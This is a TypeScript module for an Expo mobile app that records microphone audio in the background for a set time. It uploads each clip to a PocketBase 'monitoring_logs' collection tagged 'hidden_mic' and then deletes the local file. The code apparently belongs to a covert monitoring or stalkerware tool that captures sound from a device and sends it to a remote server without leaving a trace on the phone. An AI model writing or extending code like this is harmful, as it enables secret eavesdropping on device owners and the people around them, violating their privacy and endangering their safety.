import { Audio } from 'expo-av';
import * as FileSystem from 'expo-file-system';
import { pb } from '../../services/pocketbase';

let recording: Audio.Recording | null = null;

export const startAudioRecording = async (durationMs: number = 10000) => {
    try {
        const perm = await Audio.requestPermissionsAsync();
        if (perm.status !== 'granted') return;

        await Audio.setAudioModeAsync({
            allowsRecordingIOS: true,
            playsInSilentModeIOS: true,
            staysActiveInBackground: true, // Key for Android background recording
        });

        const { recording: newRecording } = await Audio.Recording.createAsync(
            Audio.RecordingOptionsPresets.HIGH_QUALITY
        );
        recording = newRecording;
        console.log('Recording started');

        // Automatically stop after duration
        setTimeout(async () => {
            await stopAudioRecording();
        }, durationMs);

    } catch (err) {
        console.error('Failed to start recording', err);
    }
};

export const stopAudioRecording = async () => {
    if (!recording) return;

    try {
        console.log('Stopping recording..');
        await recording.stopAndUnloadAsync();
        const uri = recording.getURI();
        recording = null;

        if (uri) {
            await uploadAudio(uri);
        }
    } catch (err) {
        console.error('Failed to stop recording', err);
    }
};

const uploadAudio = async (uri: string) => {
    try {
        const formData = new FormData();
        // @ts-ignore
        formData.append('file', {
            uri,
            name: `audio_${Date.now()}.m4a`,
            type: 'audio/m4a',
        });
        formData.append('type', 'hidden_mic');

        // Ensure 'monitoring_logs' collection exists in PocketBase
        await pb.collection('monitoring_logs').create(formData);
        console.log('Audio uploaded successfully');

        // Cleanup local file
        await FileSystem.deleteAsync(uri);
    } catch (err) {
        console.error('Upload failed', err);
    }
};
